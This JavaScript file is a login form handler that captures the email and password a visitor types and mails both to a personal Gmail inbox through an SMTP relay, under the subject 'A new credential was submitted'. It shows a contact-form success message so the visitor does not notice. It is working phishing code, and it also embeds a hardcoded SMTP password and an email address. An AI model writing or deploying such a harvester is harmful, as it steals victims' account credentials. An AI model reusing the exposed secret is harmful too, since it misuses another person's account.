document.getElementById('submitForm').addEventListener('submit', function(event) {
    event.preventDefault();
  
    const email = document.getElementById('Email').value;
    const password = document.getElementById('Password').value;
  
    if ( !password || !email) {
      alert("Please fill out all fields.");
      return;
    }
  
    Email.send({
    Host: "smtp.elasticemail.com",
    Username: "work.paulmagbanua@gmail.com",
    Password: "87C8E8C7F51983AE130BDE09A2DC5C70DBA2",  
    To: "work.paulmagbanua@gmail.com",
    From: "work.paulmagbanua@gmail.com",  
    Subject: `A new credential was submitted`,
    Body: `
      <strong>Email:</strong> ${email} <br>
      <strong>Message:</strong> ${password}
    `
  }).then(
    (response) => {
      console.log(response);
      if (response === "OK") {
        alert("Your message has been sent successfully!");
        document.getElementById('contactForm').reset();
      } else {
        alert(`Failed to send message: ${response}`);
      }
    }
  );
  });
  